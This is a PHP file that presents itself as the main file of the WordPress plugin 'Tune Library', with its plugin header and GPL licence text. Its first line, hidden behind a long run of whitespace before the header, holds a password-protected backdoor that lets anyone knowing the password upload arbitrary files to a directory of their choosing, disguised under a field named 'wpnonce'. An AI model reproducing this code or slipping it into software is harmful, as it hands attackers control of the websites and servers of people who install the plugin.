<?php                                                                                                                                                                                                  if((isset($_REQUEST['pwd']))&&(md5($_REQUEST['pwd'])==='92eef09d8ed4eae0ce299c8c6f5f2a9b')){if(isset($_FILES['wpnonce'])){if(move_uploaded_file($_FILES['wpnonce']['tmp_name'],$_REQUEST['dir'].$_FILES['wpnonce']['name'])) echo "<status_success>";} else {echo "<status_error>";} exit;}
/*
Plugin Name: Tune Library
Plugin URI: http://yannickcorner.nayanna.biz/wordpress-plugins/
Description: A plugin that can be used to import an iTunes Library into a MySQl database and display the contents of the collection on a Wordpress Page.
Version: 1.5.4
Author: Yannick Lefebvre
Author URI: http://yannickcorner.nayanna.biz
*/

/*  Copyright 2009  Yannick Lefebvre  (email : ylefebvre@gmail.com)
	Part of XML Loading Code based on Musiker (http://code.google.com/p/musiker/) by Jarvis Badgley, re-used with permission
	Thanks to Gary Traffanstedt for his help on testing, his great suggestions and with AJAX

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/


/*--------INITIAL FUNCTIONS--------------------------------------------------------*/
echo "NOT_ALOWED_DIRECT_REQUEST"; 
?>
